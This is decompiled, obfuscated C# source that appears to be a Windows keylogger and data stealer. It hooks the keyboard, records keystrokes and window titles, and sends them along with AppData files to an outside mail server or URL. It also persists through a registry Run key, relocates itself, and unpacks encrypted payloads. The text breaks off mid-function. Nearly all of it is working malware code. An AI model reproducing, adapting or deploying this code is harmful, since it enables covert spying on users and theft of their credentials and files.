using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns2;
using ns3;
using ns5;

namespace ns1;

internal class Class22
{
	static void smethod_0()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_4("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class22.smethod_4("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_4("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class22.smethod_4("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		try
		{
			double double_ = 25.0;
			Class22.smethod_10(ref double_);
			string text = Class22.smethod_4("lZGdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3krPbvpvBxdnMd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ4sg4=", "False") + Environment.NewLine + Environment.NewLine + Class5.string_0 + Environment.NewLine + Environment.NewLine + Class5.string_1 + Environment.NewLine + Environment.NewLine + Class5.string_2 + Environment.NewLine + Environment.NewLine + Class5.string_3 + Environment.NewLine + Environment.NewLine + Class5.string_4 + Environment.NewLine + Environment.NewLine + Class5.string_5 + Environment.NewLine + Environment.NewLine + Class5.string_6 + Environment.NewLine + Environment.NewLine + Class5.string_7 + Environment.NewLine + Environment.NewLine + Class5.string_8 + Environment.NewLine + Environment.NewLine + Class5.string_9 + Environment.NewLine + Environment.NewLine + Class5.string_10 + Environment.NewLine + Environment.NewLine + Class5.string_11 + Environment.NewLine + Environment.NewLine + Class22.smethod_4("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo0f", "False");
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(Class5.string_13);
				mailMessage2.To.Add(Class5.string_13);
				mailMessage2.Subject = Class22.smethod_4("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + Class22.smethod_4("aQ0=", Class22.smethod_4("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(Class5.string_15);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = Class5.int_0;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(Class5.string_13, Class5.string_14);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = Class22.smethod_4("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
					_ = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + Class5.string_13 + "&subject=" + Strings.Replace(Class22.smethod_4("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + Class22.smethod_4("aQ0=", Class22.smethod_4("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + Class5.string_13).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_1(Class15.Class17 class17_0, int int_0)
	{
		if (class17_0.int_2 < int_0)
		{
			if (class17_0.int_0 == class17_0.int_1)
			{
				return -1;
			}
			class17_0.uint_0 |= (uint)(((class17_0.byte_0[class17_0.int_0++] & 0xFF) | ((class17_0.byte_0[class17_0.int_0++] & 0xFF) << 8)) << class17_0.int_2);
			class17_0.int_2 += 16;
		}
		return (int)(class17_0.uint_0 & ((1 << int_0) - 1));
	}

	static void smethod_2()
	{
		try
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_4("foqxsrORsLe1tX6Usb2WkqGpw6aUa63HpiQ=", "False")))
			{
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_4("fYmwsbKQr7a0tH2TsLyVkaCowqWTaqzGpSU=", "False"));
			}
			string? fileName = Process.GetCurrentProcess().MainModule!.FileName;
			string string_ = Process.GetCurrentProcess().MainModule!.FileName;
			Class22.MoveFileExW(Strings.Left(fileName, Class22.GetModuleFileNameA(0, ref string_, 256)), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_4("oKzT1NWz0tnX16C209+4tMPL5ci2jc/pyAI=", "False"), 8L);
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_4("c3+mp6iGpayqqnOJprKLh5aeuJuJYKK8my8=", "False"));
			Class22.ExitProcess(0u);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static byte[] smethod_3(byte[] byte_0, byte[] byte_1)
	{
		checked
		{
			int num = byte_0[byte_0.Length - 1];
			byte[] array = new byte[byte_0.Length - 2 + 1];
			short num2 = 0;
			try
			{
				int num3 = byte_0.Length - 2;
				for (int i = 0; i <= num3; i++)
				{
					if (num2 >= byte_1.Length)
					{
						num2 = 0;
					}
					if (i < byte_0.Length - 1)
					{
						array[i] = Convert.ToByte(unchecked((int)byte_0[i]) - unchecked(array.Length % byte_1.Length) - unchecked((int)byte_1[num2]) + num);
						num2 = (short)(num2 + 1);
					}
				}
				return array;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				byte[] result = array;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	static string smethod_4(string string_0, string string_1)
	{
		string @string = default(string);
		try
		{
			@string = Encoding.UTF8.GetString(Class22.smethod_3(Convert.FromBase64String(string_0), Encoding.UTF8.GetBytes(string_1)));
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	static string smethod_5(IntPtr intptr_0)
	{
		string result = default(string);
		try
		{
			if (intptr_0.ToInt32() <= 0)
			{
				result = null;
				return result;
			}
			int windowTextLength = Class22.GetWindowTextLength(intptr_0);
			if (windowTextLength == 0)
			{
				result = null;
				return result;
			}
			StringBuilder stringBuilder = new StringBuilder(checked(windowTextLength + 1));
			Class22.GetWindowTextA((int)intptr_0, stringBuilder, stringBuilder.Capacity);
			result = stringBuilder.ToString().Trim();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static int smethod_6(Class15.Stream0 stream0_0)
	{
		return Class22.smethod_25(stream0_0) | (Class22.smethod_25(stream0_0) << 16);
	}

	static void smethod_7()
	{
		try
		{
			Class7.delegate0_0 = Class22.smethod_11;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class7.intptr_0 = (IntPtr)Class22.SetWindowsHookExA(13, Class7.delegate0_0, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_8(Class15.Class19 class19_0, Class15.Class17 class17_0)
	{
		int num;
		int num2;
		if ((num = Class22.smethod_1(class17_0, 9)) >= 0)
		{
			if ((num2 = class19_0.short_0[num]) >= 0)
			{
				Class22.smethod_21(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class22.smethod_1(class17_0, int_)) >= 0)
			{
				num2 = class19_0.short_0[num3 | (num >> 9)];
				Class22.smethod_21(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			int int_2 = class17_0.int_2;
			num = Class22.smethod_1(class17_0, int_2);
			num2 = class19_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= int_2)
			{
				Class22.smethod_21(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int int_3 = class17_0.int_2;
		num = Class22.smethod_1(class17_0, int_3);
		num2 = class19_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= int_3)
		{
			Class22.smethod_21(class17_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static int smethod_9(Class15.Class17 class17_0)
	{
		return class17_0.int_2;
	}

	static void smethod_10(ref double double_0)
	{
		try
		{
			DateTime t = DateAndTime.get_Now().AddSeconds(double_0);
			while (DateTime.Compare(DateAndTime.get_Now(), t) < 0)
			{
				Application.DoEvents();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_11(int int_0, int int_1, ref Class7.Struct0 struct0_0)
	{
		try
		{
			string text = Class22.smethod_5(Class22.GetForegroundWindow());
			if (Operators.CompareString(text, Class7.string_1, false) != 0)
			{
				Class7.string_1 = text;
				Class5.string_12 = Class5.string_12 + Environment.NewLine + Class22.smethod_4("hXOKhHZXcn2EdldyfYR2V3J9hHZXcn2EdldyfYR2V3J9Hw==", "False") + text + Class22.smethod_4("aoWQl4lqhZCXiWqFkJeJaoWQl4lqhZCXiWqFkJeJd4bADA==", "False") + Environment.NewLine + Environment.NewLine;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		int result = default(int);
		try
		{
			string text2 = "";
			if (int_1 == 256 || int_1 == 260)
			{
				checked
				{
					switch (struct0_0.int_0)
					{
					case 8:
						Class5.string_12 = Class5.string_12.Substring(0, Class5.string_12.Length - 1);
						break;
					case 9:
						text2 = char.ConvertFromUtf32(9);
						break;
					case 13:
						text2 = Environment.NewLine;
						break;
					case 20:
						text2 = ((!Control.IsKeyLocked((Keys)20)) ? Class22.smethod_4("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : Class22.smethod_4("QpiLkJF1XZSehG1dl5WHf10m", "False"));
						break;
					case 27:
						text2 = Class22.smethod_4("S6GWy62IZh0=", "False");
						break;
					case 32:
						text2 = Class22.smethod_4("RyA=", "False");
						break;
					case 35:
						text2 = Class22.smethod_4("R52SwqqEYiE=", "False");
						break;
					case 36:
						text2 = Class22.smethod_4("WrCo1safsoAP", "False");
						break;
					case 37:
						text2 = Class22.smethod_4("U6mVvXIT", "False");
						break;
					case 38:
						text2 = Class22.smethod_4("SJ6ssmce", "False");
						break;
					case 39:
						text2 = Class22.smethod_4("X7WjyX4H", "False");
						break;
					case 40:
						text2 = Class22.smethod_4("O5GXpVor", "False");
						break;
					case 46:
						text2 = Class22.smethod_4("WrCkzMWXdQ4=", "False");
						break;
					case 48:
					case 49:
					case 50:
					case 51:
					case 52:
					case 53:
					case 54:
					case 55:
					case 56:
					case 57:
						if (((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown())
						{
							string text3 = Class22.smethod_4("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False");
							string[] array = text3.Split(new char[1] { Conversions.ToChar(Class22.smethod_4("VBM=", "False")) });
							switch (struct0_0.int_0)
							{
							case 48:
								text2 = array[9];
								break;
							case 49:
								text2 = array[0];
								break;
							case 50:
								text2 = array[1];
								break;
							case 51:
								text2 = array[2];
								break;
							case 52:
								text2 = array[3];
								break;
							case 53:
								text2 = array[4];
								break;
							case 54:
								text2 = array[5];
								break;
							case 55:
								text2 = array[6];
								break;
							case 56:
								text2 = array[7];
								break;
							case 57:
								text2 = array[8];
								break;
							}
						}
						else
						{
							text2 = char.ConvertFromUtf32(struct0_0.int_0);
						}
						break;
					case 65:
					case 66:
					case 67:
					case 68:
					case 69:
					case 70:
					case 71:
					case 72:
					case 73:
					case 74:
					case 75:
					case 76:
					case 77:
					case 78:
					case 79:
					case 80:
					case 81:
					case 82:
					case 83:
					case 84:
					case 85:
					case 86:
					case 87:
					case 88:
					case 89:
					case 90:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? char.ConvertFromUtf32(struct0_0.int_0 + 32).ToLower() : char.ConvertFromUtf32(struct0_0.int_0 + 32).ToUpper());
						break;
					case 112:
					case 113:
					case 114:
					case 115:
					case 116:
					case 117:
					case 118:
					case 119:
					case 120:
					case 121:
					case 122:
					case 123:
					case 124:
					case 125:
					case 126:
					case 127:
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
					case 134:
					case 135:
						text2 = Class22.smethod_4("UaedGA==", "False") + Conversions.ToString(struct0_0.int_0 - 111) + Class22.smethod_4("o4EC", "False");
						break;
					case 162:
					case 163:
						text2 = Class22.smethod_4("Vaue0cKpwsrOsVUS", "False");
						break;
					case 164:
					case 165:
						text2 = Class22.smethod_4("RJqLvbeBXyQ=", "False");
						break;
					case 186:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class22.smethod_4("cBI=", "False") : Class22.smethod_4("axY=", "False"));
						break;
					case 187:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class22.smethod_4("WSs=", "False") : Class22.smethod_4("bAY=", "False"));
						break;
					case 188:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class22.smethod_4("YhE=", "False") : Class22.smethod_4("XCc=", "False"));
						break;
					case 189:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class22.smethod_4("cAQ=", "False") : Class22.smethod_4("eC4=", "False"));
						break;
					case 190:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class22.smethod_4("ZRA=", "False") : Class22.smethod_4("bRg=", "False"));
						break;
					case 191:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class22.smethod_4("aQ0=", "False") : Class22.smethod_4("gQU=", "False"));
						break;
					case 192:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class22.smethod_4("lBM=", "False") : Class22.smethod_4("vQg=", "False"));
						break;
					default:
						text2 = char.ConvertFromUtf32(struct0_0.int_0);
						break;
					case 219:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class22.smethod_4("mgg=", "False") : Class22.smethod_4("wAI=", "False"));
						break;
					case 220:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class22.smethod_4("czA=", "False") : Class22.smethod_4("vwQ=", "False"));
						break;
					case 221:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class22.smethod_4("gSM=", "False") : Class22.smethod_4("rBg=", "False"));
						break;
					case 222:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class22.smethod_4("bQE=", "False") : Class22.smethod_4("Ths=", "False"));
						break;
					}
					Class5.string_12 += text2;
					Class5.string_31 = Class5.string_12;
					return result;
				}
			}
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static void smethod_12(Class15.Class18 class18_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class18_0.byte_0[class18_0.int_0++] = class18_0.byte_0[int_0++];
			class18_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static void smethod_13()
	{
		int num = 0;
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_4("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False")))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_4("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False"), overwrite: true);
			}
		}
		catch (Exception ex)
		{
			int num2 = default(int);
			ProjectData.SetProjectError(ex, num2);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			int num2 = 1;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class22.smethod_4("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), writable: true);
				registryKey.SetValue(Class10.Class11.string_0, Class10.Class11.string_1);
				registryKey.Close();
				Thread.Sleep(5000);
				try
				{
					Class5.thread_2.Abort();
					break;
				}
				catch (Exception ex2)
				{
					ProjectData.SetProjectError(ex2, num2);
					ProjectData.ClearProjectError();
					break;
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3, num2);
				if (num == 3)
				{
					try
					{
						Class5.thread_2.Abort();
					}
					catch (Exception ex4)
					{
						ProjectData.SetProjectError(ex4, num2);
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
					break;
				}
				num = checked(num + 1);
				ProjectData.ClearProjectError();
			}
		}
	}

	static bool smethod_14(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_0.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_1.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static int smethod_15(byte[] byte_0, int int_0, Class15.Class18 class18_0, int int_1)
	{
		int num = class18_0.int_0;
		if (int_1 > class18_0.int_1)
		{
			int_1 = class18_0.int_1;
		}
		else
		{
			num = (class18_0.int_0 - class18_0.int_1 + int_1) & 0x7FFF;
		}
		int num2 = int_1;
		int num3 = int_1 - num;
		if (num3 > 0)
		{
			Array.Copy(class18_0.byte_0, 32768 - num3, byte_0, int_0, num3);
			int_0 += num3;
			int_1 = num;
		}
		Array.Copy(class18_0.byte_0, num - int_1, byte_0, int_0, int_1);
		class18_0.int_1 -= num2;
		if (class18_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return num2;
	}

	static byte[] smethod_16(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class22.smethod_14(executingAssembly, callingAssembly))
		{
			return null;
		}
		Class15.Stream0 stream = new Class15.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class22.smethod_6(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class22.smethod_25(stream);
			int num3 = Class22.smethod_25(stream);
			int num4 = Class22.smethod_25(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class22.smethod_6(stream);
			Class22.smethod_6(stream);
			Class22.smethod_6(stream);
			int num5 = Class22.smethod_6(stream);
			int num6 = Class22.smethod_25(stream);
			int num7 = Class22.smethod_25(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class15.Class16 class16_ = new Class15.Class16(array2);
			array = new byte[num5];
			Class22.smethod_34(array, class16_, 0, array.Length);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class22.smethod_6(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class22.smethod_6(stream);
					num11 = Class22.smethod_6(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class15.Class16 class16_2 = new Class15.Class16(array3);
					Class22.smethod_34(array, class16_2, i, num11);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 255, 155, 200, 107, 150, 222, 93, 110 };
				byte[] byte_2 = new byte[8] { 56, 133, 21, 230, 129, 220, 167, 127 };
				using Class14 class14_ = new Class14();
				using ICryptoTransform cryptoTransform = Class22.smethod_26(byte_2, byte_, bool_0: true, class14_);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class22.smethod_16(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using Class13 class13_ = new Class13();
				using ICryptoTransform cryptoTransform2 = Class22.smethod_32(bool_0: true, class13_, byte_4, byte_5);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class22.smethod_16(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	static extern int GetWindowTextLength(IntPtr intptr_0);

	static short smethod_17(int int_0)
	{
		return (short)((Class15.Class21.byte_0[int_0 & 0xF] << 12) | (Class15.Class21.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class15.Class21.byte_0[(int_0 >> 8) & 0xF] << 4) | Class15.Class21.byte_0[int_0 >> 12]);
	}

	static void smethod_18(Class14 class14_0)
	{
		class14_0.type_0.GetMethod("Clear")!.Invoke(class14_0.object_0, new object[0]);
	}

	[DllImport("user32.dll", SetLastError = true)]
	static extern IntPtr GetForegroundWindow();

	static bool smethod_19(Class15.Class16 class16_0)
	{
		switch (class16_0.int_4)
		{
		case 2:
		{
			if (class16_0.bool_0)
			{
				class16_0.int_4 = 12;
				return false;
			}
			int num = Class22.smethod_1(class16_0.class17_0, 3);
			if (num < 0)
			{
				return false;
			}
			Class22.smethod_21(class16_0.class17_0, 3);
			if (((uint)num & (true ? 1u : 0u)) != 0)
			{
				class16_0.bool_0 = true;
			}
			switch (num >> 1)
			{
			case 0:
				Class22.smethod_20(class16_0.class17_0);
				class16_0.int_4 = 3;
				break;
			case 1:
				class16_0.class19_0 = Class15.Class19.class19_0;
				class16_0.class19_1 = Class15.Class19.class19_1;
				class16_0.int_4 = 7;
				break;
			case 2:
				class16_0.class20_0 = new Class15.Class20();
				class16_0.int_4 = 6;
				break;
			}
			return true;
		}
		case 3:
			if ((class16_0.int_8 = Class22.smethod_1(class16_0.class17_0, 16)) < 0)
			{
				return false;
			}
			Class22.smethod_21(class16_0.class17_0, 16);
			class16_0.int_4 = 4;
			goto case 4;
		case 4:
		{
			int num2 = Class22.smethod_1(class16_0.class17_0, 16);
			if (num2 < 0)
			{
				return false;
			}
			Class22.smethod_21(class16_0.class17_0, 16);
			class16_0.int_4 = 5;
			goto case 5;
		}
		case 5:
		{
			int num3 = Class22.smethod_30(class16_0.class18_0, class16_0.class17_0, class16_0.int_8);
			class16_0.int_8 -= num3;
			if (class16_0.int_8 == 0)
			{
				class16_0.int_4 = 2;
				return true;
			}
			return !Class22.smethod_33(class16_0.class17_0);
		}
		case 6:
			if (!Class22.smethod_37(class16_0.class20_0, class16_0.class17_0))
			{
				return false;
			}
			class16_0.class19_0 = Class22.smethod_38(class16_0.class20_0);
			class16_0.class19_1 = Class22.smethod_24(class16_0.class20_0);
			class16_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class22.smethod_31(class16_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static void smethod_20(Class15.Class17 class17_0)
	{
		class17_0.uint_0 >>= class17_0.int_2 & 7;
		class17_0.int_2 &= -8;
	}

	static void smethod_21(Class15.Class17 class17_0, int int_0)
	{
		class17_0.uint_0 >>= int_0;
		class17_0.int_2 -= int_0;
	}

	static void smethod_22(Class15.Class18 class18_0, int int_0)
	{
		if (class18_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class18_0.byte_0[class18_0.int_0++] = (byte)int_0;
		class18_0.int_0 &= 32767;
	}

	static void smethod_23(Class13 class13_0)
	{
		class13_0.type_0.GetMethod("Clear")!.Invoke(class13_0.object_0, new object[0]);
	}

	static Class15.Class19 smethod_24(Class15.Class20 class20_0)
	{
		byte[] array = new byte[class20_0.int_4];
		Array.Copy(class20_0.byte_1, class20_0.int_3, array, 0, class20_0.int_4);
		return new Class15.Class19(array);
	}

	static int smethod_25(Class15.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static ICryptoTransform smethod_26(byte[] byte_0, byte[] byte_1, bool bool_0, Class14 class14_0)
	{
		class14_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class14_0.object_0, new object[1] { byte_1 });
		class14_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class14_0.object_0, new object[1] { byte_0 });
		MethodInfo method = class14_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class14_0.object_0, new object[0]);
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetModuleFileNameA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1);

	static void smethod_27(byte[] byte_0, Class15.Class19 class19_0)
	{
		int[] array = new int[16];
		int[] array2 = new int[16];
		foreach (int num in byte_0)
		{
			if (num > 0)
			{
				int[] array3;
				int[] array4 = (array3 = array);
				nint num2 = num;
				array4[num] = array3[num2] + 1;
			}
		}
		int num3 = 0;
		int num4 = 512;
		for (int j = 1; j <= 15; j++)
		{
			array2[j] = num3;
			num3 += array[j] << 16 - j;
			if (j >= 10)
			{
				int num5 = array2[j] & 0x1FF80;
				int num6 = num3 & 0x1FF80;
				num4 += num6 - num5 >> 16 - j;
			}
		}
		class19_0.short_0 = new short[num4];
		int num7 = 512;
		for (int num8 = 15; num8 >= 10; num8--)
		{
			int num9 = num3 & 0x1FF80;
			num3 -= array[num8] << 16 - num8;
			int num10 = num3 & 0x1FF80;
			for (int k = num10; k < num9; k += 128)
			{
				class19_0.short_0[Class22.smethod_17(k)] = (short)((-num7 << 4) | num8);
				num7 += 1 << num8 - 9;
			}
		}
		for (int l = 0; l < byte_0.Length; l++)
		{
			int num11 = byte_0[l];
			if (num11 == 0)
			{
				continue;
			}
			num3 = array2[num11];
			int num12 = Class22.smethod_17(num3);
			if (num11 <= 9)
			{
				do
				{
					class19_0.short_0[num12] = (short)((l << 4) | num11);
					num12 += 1 << num11;
				}
				while (num12 < 512);
			}
			else
			{
				int num13 = class19_0.short_0[num12 & 0x1FF];
				int num14 = 1 << (num13 & 0xF);
				num13 = -(num13 >> 4);
				do
				{
					class19_0.short_0[num13 | (num12 >> 9)] = (short)((l << 4) | num11);
					num12 += 1 << num11;
				}
				while (num12 < num14);
			}
			array2[num11] = num3 + (1 << 16 - num11);
		}
	}

	static int smethod_28(Class15.Class18 class18_0)
	{
		return 32768 - class18_0.int_1;
	}

	static int smethod_29(Class15.Class18 class18_0)
	{
		return class18_0.int_1;
	}

	static int smethod_30(Class15.Class18 class18_0, Class15.Class17 class17_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class18_0.int_1), Class22.smethod_40(class17_0));
		int num = 32768 - class18_0.int_0;
		int num2;
		if (int_0 > num)
		{
			num2 = Class22.smethod_36(class17_0, class18_0.byte_0, class18_0.int_0, num);
			if (num2 == num)
			{
				num2 += Class22.smethod_36(class17_0, class18_0.byte_0, 0, int_0 - num);
			}
		}
		else
		{
			num2 = Class22.smethod_36(class17_0, class18_0.byte_0, class18_0.int_0, int_0);
		}
		class18_0.int_0 = (class18_0.int_0 + num2) & 0x7FFF;
		class18_0.int_1 += num2;
		return num2;
	}

	static bool smethod_31(Class15.Class16 class16_0)
	{
		int num = Class22.smethod_28(class16_0.class18_0);
		while (num >= 258)
		{
			switch (class16_0.int_4)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class22.smethod_8(class16_0.class19_0, class16_0.class17_0)) & -256) == 0)
				{
					Class22.smethod_22(class16_0.class18_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class16_0.int_6 = Class15.Class16.int_0[num2 - 257];
